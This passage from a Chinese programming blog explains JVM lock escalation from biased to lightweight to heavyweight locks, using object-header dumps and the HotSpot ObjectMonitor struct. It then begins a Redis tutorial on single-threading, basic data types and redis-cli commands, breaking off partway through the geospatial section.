<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一次输出：匿名偏向锁</span></span><br><span class="line">OFFSET  SIZE   TYPE DESCRIPTION         VALUE</span><br><span class="line">     <span class="number">0</span>     <span class="number">4</span>      (object header)      <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> (<span class="number">00000101</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>) (<span class="number">5</span>)</span><br><span class="line">     <span class="number">4</span>     <span class="number">4</span>      (object header)      <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> (<span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>) (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二次输出：偏向锁(线程1持有)</span></span><br><span class="line">OFFSET  SIZE    TYPE DESCRIPTION       VALUE</span><br><span class="line">     <span class="number">0</span>     <span class="number">4</span>      (object header)    <span class="number">05</span> d8 b2 <span class="number">1f</span> (<span class="number">00000101</span> <span class="number">11011000</span> <span class="number">10110010</span> <span class="number">00011111</span>) (<span class="number">531814405</span>)</span><br><span class="line">     <span class="number">4</span>     <span class="number">4</span>      (object header)    <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> (<span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>) (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三次输出：偏向锁(线程1持有)</span></span><br><span class="line">OFFSET  SIZE   TYPE DESCRIPTION         VALUE</span><br><span class="line">     <span class="number">0</span>     <span class="number">4</span>      (object header)    <span class="number">05</span> d8 b2 <span class="number">1f</span> (<span class="number">00000101</span> <span class="number">11011000</span> <span class="number">10110010</span> <span class="number">00011111</span>) (<span class="number">531814405</span>)</span><br><span class="line">     <span class="number">4</span>     <span class="number">4</span>      (object header)    <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> (<span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>) (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第四次输出：轻量级锁(线程2持有)</span></span><br><span class="line">OFFSET  SIZE   TYPE DESCRIPTION         VALUE</span><br><span class="line">     <span class="number">0</span>     <span class="number">4</span>      (object header)    <span class="number">90</span> f0 <span class="number">94</span> <span class="number">1f</span> (<span class="number">10010000</span> <span class="number">11110000</span> <span class="number">10010100</span> <span class="number">00011111</span>) (<span class="number">529854608</span>)</span><br><span class="line">     <span class="number">4</span>     <span class="number">4</span>      (object header)    <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> (<span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>) (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到，当线程2申请锁后，由于当前偏向锁中的线程ID不是自己的ID，因此升级为了轻量级锁。轻量级锁对应的Mark Word中除了锁标志位，还有一个**指向线程栈中锁记录的指针(pointer to Lock Record)**，那么这个锁记录(Lock Record)是什么？</p>
<p>当升级为轻量级锁后，Mark Word的结构会发生改变，原来Mark Word的内容会被拷贝至当前持有该锁的线程栈帧中的**锁记录(Lock Record)**区域，而Mark Word会变为指向这块区域的一个指针。如图所示：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/05/9u75zTiNYlKaFhg.jpg"
                      alt="Screenshot_67.jpg"
                ></p>
<p>Lock Record是线程帧栈中的一个内存区域，其中有两个重要的字段：</p>
<ul>
<li>_displaced_header：存放原来锁对象Mark Word的拷贝，用于CAS操作</li>
<li>owner：指向锁对象，便于找到哪个对象被锁住了</li>
</ul>
<p>简单来说，Mark Word中的指针用于找到哪个线程正持有该锁。如果有另一个线程要获取该轻量级锁，流程如下：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/05/iwP81IlE9y3VurL.jpg"
                      alt="Screenshot_69.jpg"
                ></p>
<p>可以看到，轻量级锁竞争的过程，其实主要就是锁对象Mark Word中锁记录指针修改的过程，如果修改失败，那么说明该锁对象正在被其他线程持有。自旋一会，依旧不能获得锁就会升级为重量级锁。这样看，轻量级锁的情况下一旦有竞争，就会升级为重量级锁，那轻量级锁的存在有什么意义呢？</p>
<p>轻量级锁能够提升程序性能的依据是<strong>对绝大部分的锁，在整个同步周期内都不存在竞争</strong>，注意这是经验数据。需要了解的是，轻量级锁所适应的场景是<strong>线程交替执行</strong>同步块的场合，如果存在同一时间访问同一锁的场合，即产生了锁的竞争，就会导致轻量级锁膨胀为重量级锁。 膨胀过程大致如下：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/05/1liYHjt5ozV8DpL.jpg"
                      alt="Screenshot_70.jpg"
                ></p>
<ol>
<li>线程2申请轻量级锁，发现锁记录指针指向线程1的栈帧，锁被线程1持有，发生了锁竞争，锁进行膨胀</li>
<li>线程2初始化Monitor对象，将锁记录指针修改为指向Monitor对象的指针</li>
<li>此时，线程1还在执行，因此Monitor的拥有者为线程1，而线程2进入等待队列</li>
<li>线程1执行完毕后，发现锁以及升级为重量级锁了，通过锁记录中的owner找到Monitor对象，进行重量级锁的释放流程</li>
</ol>
<h3 id="重量级锁-多线程存在竞争"><a href="#重量级锁-多线程存在竞争" class="headerlink" title="重量级锁(多线程存在竞争)"></a>重量级锁(多线程存在竞争)</h3><p>在轻量级锁的情况下，如果存在了多线程竞争锁，那锁就会升级为重量级锁，对象的Mark Word也会发生变化：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/05/o7svrghZ1Hk2u43.jpg"
                      alt="Screenshot_71.jpg"
                ></p>
<p>我们来演示一下重量级锁：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Juc_PrintMarkWord</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="comment">// 未出现任何获取锁的时候</span></span><br><span class="line">        System.out.println(ClassLayout.parseInstance(o).toPrintable());</span><br><span class="line">	    <span class="comment">// 线程1获取锁</span></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (a)&#123;</span><br><span class="line">                    System.out.println(ClassLayout.parseInstance(a).toPrintable());</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">//让线程晚点死亡，造成锁的竞争</span></span><br><span class="line">                        Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 线程2获取锁</span></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (a)&#123;</span><br><span class="line">                    System.out.println(ClassLayout.parseInstance(a).toPrintable());</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 线程1、2同时启动，产生锁竞争</span></span><br><span class="line">        thread1.start();</span><br><span class="line">        thread2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 结果如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一次输出:匿名偏向锁</span></span><br><span class="line">OFFSET  SIZE   TYPE DESCRIPTION          VALUE</span><br><span class="line">     <span class="number">0</span>     <span class="number">4</span>      (object header)       <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> (<span class="number">00000101</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>) (<span class="number">5</span>)</span><br><span class="line">     <span class="number">4</span>     <span class="number">4</span>      (object header)       <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> (<span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>) (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二次输出:偏向锁</span></span><br><span class="line">OFFSET  SIZE   TYPE DESCRIPTION        VALUE</span><br><span class="line">     <span class="number">0</span>     <span class="number">4</span>      (object header)     <span class="number">05</span> <span class="number">98</span> e7 <span class="number">1f</span> (<span class="number">00000101</span> <span class="number">10011000</span> <span class="number">11100111</span> <span class="number">00011111</span>) (<span class="number">535271429</span>)</span><br><span class="line">     <span class="number">4</span>     <span class="number">4</span>      (object header)     <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> (<span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>) (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三次输出：重量级锁</span></span><br><span class="line">OFFSET  SIZE   TYPE DESCRIPTION        VALUE</span><br><span class="line">     <span class="number">0</span>     <span class="number">4</span>      (object header)     a f5 e3 1c (<span class="number">01011010</span> <span class="number">11110101</span> <span class="number">11100011</span> <span class="number">00011100</span>) (<span class="number">484701530</span>)</span><br><span class="line">     <span class="number">4</span>     <span class="number">4</span>      (object header)     <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> (<span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>) (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到，线程1、2同时启动后，会产生锁竞争，于是我们看到出现了重量级锁。之前我们能也介绍了，Mark Word中的指向锁记录的指针，会变成指向<strong>Monitor</strong>对象的指针。那这个Monitor对象是什么？它有什么用？</p>
<p>我们先来看看C++源码中对Monitor的定义：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Monitor的结构体</span></span><br><span class="line">ObjectMonitor::<span class="built_in">ObjectMonitor</span>() &#123;  </span><br><span class="line">  _header       = <span class="literal">NULL</span>;    <span class="comment">// 对象头</span></span><br><span class="line">  _count        = <span class="number">0</span>;       </span><br><span class="line">  _waiters      = <span class="number">0</span>,  </span><br><span class="line">  _recursions   = <span class="number">0</span>;       <span class="comment">// 线程的重入次数</span></span><br><span class="line">  _object       = <span class="literal">NULL</span>;    </span><br><span class="line">  _owner        = <span class="literal">NULL</span>;    <span class="comment">// 标识拥有该monitor的线程，即持有锁的线程</span></span><br><span class="line">  _WaitSet      = <span class="literal">NULL</span>;    <span class="comment">// 等待线程的集合，调用object.wait()方法处于wait状态的线程处于其中</span></span><br><span class="line">                           <span class="comment">// 调用object.notify()方法后会进入_cxq或_EntryList中</span></span><br><span class="line">  _WaitSetLock  = <span class="number">0</span> ;  </span><br><span class="line">  _Responsible  = <span class="literal">NULL</span> ;  </span><br><span class="line">  _succ         = <span class="literal">NULL</span> ;  </span><br><span class="line">  _cxq          = <span class="literal">NULL</span> ;    <span class="comment">// 多线程竞争锁时，竞争线程首先进入的单向链表</span></span><br><span class="line">  FreeNext      = <span class="literal">NULL</span> ;  </span><br><span class="line">  _EntryList    = <span class="literal">NULL</span> ;    <span class="comment">// 所有在等待获取锁的线程的集合</span></span><br><span class="line">  _SpinFreq     = <span class="number">0</span> ;  </span><br><span class="line">  _SpinClock    = <span class="number">0</span> ;  </span><br><span class="line">  OwnerIsThread = <span class="number">0</span> ;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以把Monitor理解为一个同步工具，也可以描述为一种同步机制，它通常被描述为一个对象。</p>
<p>与一切皆对象一样，在Java虚拟机（HotSpot）中，Monitor是由ObjectMonitor实现的，它就是实现重量级锁的关键。</p>
<p>所有的状态为重量级锁的对象，其对象头中的指针都指向一个Monitor，那么所有线程针对这把锁的竞争、释放都是基于这个Monitor实现的。</p>
<p>我们来看看在重量级锁的级别下线程对锁的竞争：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/05/P2ylkgvSQboLxr8.jpg"
                      alt="Screenshot_72.jpg"
                ></p>
<p>我们看到了一个叫做<strong>自旋</strong>的操作，什么是自旋？</p>
<p>锁申请失败后，虚拟机为了避免线程真实地在操作系统层面挂起，还会进行一项称为自旋锁的优化手段。</p>
<p>这是基于在大多数情况下，线程持有锁的时间都不会太长，如果直接挂起操作系统层面的线程可能会得不偿失，毕竟在我们之前介绍过的<strong>内核线程模型下，操作系统实现线程之间的切换时需要从用户态转换到内核态</strong>，这个状态之间的转换需要相对比较长的时间，时间成本相对较高。</p>
<p>因此自旋锁会假设在不久将来，当前的线程可以获得锁，因此虚拟机会让当前想要获取锁的线程循环重新申请锁。</p>
<p>在经过若干次循环后，如果得到锁，就顺利进入临界区。如果还不能获得锁，那就会将线程在操作系统层面挂起。我们可以通过下面的伪代码理解：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设定自旋次数为10</span></span><br><span class="line">count = <span class="number">10</span>;</span><br><span class="line"><span class="comment">// 自旋</span></span><br><span class="line"><span class="keyword">while</span>(count &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// 申请成功</span></span><br><span class="line">    <span class="keyword">if</span>(加锁成功) <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 申请失败</span></span><br><span class="line">    count--;</span><br><span class="line">    <span class="comment">// 自旋10次后仍然申请失败</span></span><br><span class="line">    <span class="keyword">if</span>(count == <span class="number">0</span>) 阻塞线程;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 执行同步代码块</span></span><br></pre></td></tr></table></figure>

<p>当然，虽然通过自旋的方式可以在一定程度上减少用户态和内核态的切换，减少对操作系统中与线程相关的库函数调用，但是自旋的过程需要一直占用CPU，因此过度的自旋可能适得其反。</p>
<p>最后注意，在Java代码中，如果线程获得锁后调用<code>object.wait()</code>方法，则会将线程加入到Monitor对象的WaitSet中，当被<code>object.notify()</code>唤醒后，会将线程从WaitSet移动到 _cxq 或 _EntryList中去。</p>
<p>需要注意的是，当调用<code>wait</code>或<code>notify</code>方法时，<strong>如当前锁的状态是偏向锁或轻量级锁则会先膨胀成重量级锁</strong>。也就是说，<code>wait和notify</code>等方法依赖于monitor对象，这就是为什么只有在同步的块或者方法中才能调用这些方法，否则会抛出<code>java.lang.IllegalMonitorStateException</code>的异常。</p>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>redis</title>
    <url>/2021/03/16/2021/redis/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/18/WxChUEtKRBjIZFG.jpg"
                      alt="Screenshot_7.jpg"
                ></p>
<p>Redis（Remote Dictionary Server )，即远程字典服务 !</p>
<p>是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 </p>
<p>redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。</p>
<p>用处：</p>
<p>1、内存存储、持久化，内存中是断电即失、所以说持久化很重要（rdb、aof） </p>
<p>2、效率高，可以用于高速缓存</p>
<p>3、发布订阅系统</p>
<p>4、地图信息分析</p>
<p>5、计时器、计数器（浏览量！）</p>
<p>6、……..</p>
<p>特性：</p>
<p>1、多样的数据类型</p>
<p>2、持久化</p>
<p>3、集群</p>
<p>4、事务</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>Redis默认有16个数据库，默认使用的是第0个数据库</p>
<p>可以使用select进行切换数据库！<code>select 3</code></p>
<p>常用的基础命令<code>flushdb</code>  清除当前数据库</p>
<p><code>FLUSHALL</code>清除所有数据库</p>
<h2 id="Redis-是单线程的！"><a href="#Redis-是单线程的！" class="headerlink" title="Redis 是单线程的！"></a>Redis 是单线程的！</h2><p>明白Redis是很快的，官方表示，Redis是基于内存操作，CPU不是Redis性能瓶颈，Redis的瓶颈是根据</p>
<p>机器的内存和网络带宽，既然可以使用单线程来实现，就使用单线程了！</p>
<p>Redis 是C 语言写的，官方提供的数据为 100000+ 的QPS，完全不比同样是使用 key-vale的Memecache差！</p>
<h2 id="Redis为什么单线程还这么快？"><a href="#Redis为什么单线程还这么快？" class="headerlink" title="Redis为什么单线程还这么快？"></a><strong>Redis为什么单线程还这么快？</strong></h2><p>1、误区1：高性能的服务器一定是多线程的？</p>
<p>2、误区2：多线程（CPU上下文会切换！）一定比单线程效率高！</p>
<p>先去CPU&gt;内存&gt;硬盘的速度要有所了解！</p>
<p>核心：redis 是将所有的数据全部放在内存中的，所以说使用单线程去操作效率就是最高的，多线程</p>
<p>（CPU上下文会切换：耗时的操作！！！），对于内存系统来说，如果没有上下文切换效率就是最高</p>
<p>的！多次读写都是在一个CPU上的，在内存情况下，这个就是最佳的方案！</p>
<p>同时注意到一些问题存在：</p>
<ul>
<li><strong>Redis真的是单线程吗？</strong></li>
</ul>
<p>Redis的单线程主要是指Redis的处理客户端发来的命令是由一个线程来完成的，这也是Redis对外提供键值存储服务的主要流程。但Redis的其他功能，比如持久化、异步删除、集群数据同步等，其实是由额外的线程执行的。</p>
<ul>
<li><strong>Redis单线程为什么还能这么快？</strong></li>
</ul>
<p>因为它所有的数据都在<strong>内存</strong>中，所有的运算都是内存级别的运算，而且单线程避免了多线程的切换性能损耗问题。正因为Redis是单线程，所以要小心使用Redis指令，对于那些耗时的指令(比如<code>KEYS</code>)一定要谨慎使用，一不小心就可能会导致Redis卡顿。</p>
<ul>
<li><strong>Redis 单线程如何处理那么多的并发客户端连接？</strong></li>
</ul>
<p>进入Redis目录，执行<code>src/redis-benchmark get</code>命令，可以对Redis的吞吐量进行测试，结果大致是<strong>每秒可以处理10万个请求</strong>。Redis使用了<strong>IO多路复用</strong>技术，利用<strong>epoll</strong>来实现IO多路复用，将连接信息和事件放到队列中，依次放到文件事件分派器，事件分派器将事件分发给事件处理器。</p>
<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><p>基本的有五种数据类型</p>
<h2 id="String"><a href="#String" class="headerlink" title="String"></a>String</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; keys * # 查看所有的key </span><br><span class="line">(empty list or <span class="built_in">set</span>) </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; <span class="built_in">set</span> name kuangshen # <span class="built_in">set</span> key </span><br><span class="line">OK</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; keys * </span><br><span class="line"><span class="number">1</span>) &quot;name&quot; </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; <span class="built_in">set</span> age <span class="number">1</span> </span><br><span class="line">OK</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; keys * </span><br><span class="line"><span class="number">1</span>) &quot;age&quot; </span><br><span class="line"><span class="number">2</span>) &quot;name&quot; </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; EXISTS name # 判断当前的key是否存在 </span><br><span class="line">(integer) <span class="number">1</span> </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; EXISTS name1 </span><br><span class="line">(integer) <span class="number">0</span> </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; <span class="built_in">move</span> name <span class="number">1</span> # 移除当前的key </span><br><span class="line">(integer) <span class="number">1</span> </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; keys * </span><br><span class="line"><span class="number">1</span>) &quot;age&quot; </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; <span class="built_in">set</span> name qinjiang </span><br><span class="line">OK</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; keys * </span><br><span class="line"><span class="number">1</span>) &quot;age&quot; </span><br><span class="line"><span class="number">2</span>) &quot;name&quot; </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; clear </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; keys * </span><br><span class="line"><span class="number">1</span>) &quot;age&quot; </span><br><span class="line"><span class="number">2</span>) &quot;name&quot; </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; get name &quot;qinjiang&quot; </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; EXPIRE name <span class="number">10</span> # 设置key的过期时间，单位是秒 (integer) <span class="number">1</span> </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; ttl name # 查看当前key的剩余时间 </span><br><span class="line">(integer) <span class="number">4</span> </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; ttl name </span><br><span class="line">(integer) <span class="number">3</span> <span class="number">1</span></span><br><span class="line"><span class="number">27</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; ttl name </span><br><span class="line">(integer) <span class="number">2</span> </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; ttl name </span><br><span class="line">(integer) <span class="number">1</span> </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; ttl name </span><br><span class="line">(integer) -<span class="number">2</span> </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; get name </span><br><span class="line">(nil) </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; <span class="built_in">type</span> name # 查看当前key的一个类型！ </span><br><span class="line">string </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; <span class="built_in">type</span> age </span><br><span class="line">string</span><br></pre></td></tr></table></figure>

<p>String类似的使用场景：value除了是我们的字符串还可以是我们的数字！</p>
<p>计数器</p>
<p>统计多单位的数量</p>
<p>粉丝数</p>
<p>对象缓存存储！</p>
<p>下面直接说吧–</p>
<h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><p>在redis里面，我们可以把list玩成 <strong>栈、队列、阻塞队列！</strong></p>
<p>所有的list命令都是用l开头的，Redis不区分大小命令</p>
<p>他实际上是一个链表，<strong>before Node after ， left，right</strong> 都可以插入值</p>
<p>如果key 不存在，创建新的链表</p>
<p>如果key存在，新增内容</p>
<p>如果移除了所有值，空链表，也代表不存在！</p>
<p>在两边插入或者改动值，效率最高！ 中间元素，相对来说效率会低一点~</p>
<p><strong>消息排队！消息队列 （Lpush Rpop）， 栈（ Lpush Lpop）！</strong></p>
<h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p>微博，A用户将所有关注的人放在一个set集合中！将它的粉丝也放在一个集合中！</p>
<p><strong>共同关注，共同爱好，二度好友，推荐好友！（六度分割理论）</strong></p>
<h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><p>Map集合，key-map! 时候这个值是一个map集合！ 本质和String类型没有太大区别，还是一个简单的</p>
<p>key-vlaue！</p>
<p>set myhash fifield kuangshen</p>
<p>hash变更的数据 user name age,尤其是是用户信息之类的，经常变动的信息！ hash 更适合于对象的</p>
<p>存储，String更加适合字符串存储！</p>
<h2 id="Zset"><a href="#Zset" class="headerlink" title="Zset"></a>Zset</h2><p>其与的一些API，通过我们的学习吗，你们剩下的如果工作中有需要，这个时候你可以去查查看官方文</p>
<p>档！</p>
<p>案例思路：set 排序 存储班级成绩表，工资表排序！</p>
<p>普通消息，1， 重要消息 2，带权重进行判断！</p>
<p><strong>排行榜应用实现，取Top N 测试！</strong></p>
<h1 id="三种特殊数据类型"><a href="#三种特殊数据类型" class="headerlink" title="三种特殊数据类型"></a>三种特殊数据类型</h1><h2 id="Geospatial-地理位置"><a href="#Geospatial-地理位置" class="headerlink" title="Geospatial 地理位置"></a><strong>Geospatial</strong> <strong>地理位置</strong></h2><p>朋友的定位，附近的人，打车距离计算？</p>
<p>Redis 的 Geo 在Redis3.2 版本就推出了！ 这个功能可以推算地理位置的信息，两地之间的距离，方圆几里的人！</p>
<p>官方文档：<a class="link"   href="https://www.redis.net.cn/order/3685.html" >https://www.redis.net.cn/order/3685.html<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># getadd 添加地理位置 </span><br><span class="line"># 规则：两级无法直接添加，我们一般会下载城市数据，直接通过java程序一次性导入！ # 有效的经度从-<span class="number">180</span>度到<span class="number">180</span>度。 </span><br><span class="line"># 有效的纬度从-<span class="number">85</span>.<span class="number">05112878</span>度到<span class="number">85</span>.<span class="number">05112878</span>度。 </span><br><span class="line"># 当坐标位置超出上述指定范围时，该命令将会返回一个错误。 </span><br><span class="line"># <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; geoadd china:city <span class="number">39</span>.<span class="number">90</span> <span class="number">116</span>.<span class="number">40</span> beijin</span><br><span class="line"></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt;  geoadd china:city <span class="number">116</span>.<span class="number">40</span> <span class="number">39</span>.<span class="number">90</span> beijing</span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; geoadd china:city <span class="number">121</span>.<span class="number">47</span> <span class="number">31</span>.<span class="number">23</span> shanghai</span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; GEOADD china:city <span class="number">106</span>.<span class="number">50</span> <span class="number">29</span>.<span class="number">53</span> chongqi <span class="number">114</span>.<span class="number">05</span> <span class="number">22</span>.<span class="number">52</span> shengzhen</span><br><span class="line"></span><br><span class="line">(integer) <span class="number">2</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; geoadd china:city <span class="number">120</span>.<span class="number">16</span> <span class="number">30</span>.<span class="number">24</span> hangzhou <span class="number">108</span>.<span class="number">96</span> <span class="number">34</span>.<span class="number">26</span> xian (integer) <span class="number">2</span></span><br><span class="line">(error) ERR syntax error</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; geoadd china:city <span class="number">120</span>.<span class="number">16</span> <span class="number">30</span>.<span class="number">24</span> hangzhou <span class="number">108</span>.<span class="number">96</span> <span class="number">34</span>.<span class="number">26</span> xian</span><br><span class="line">(integer) <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>GEOPOS 获得当前定位：一定是一个坐标值！</p>
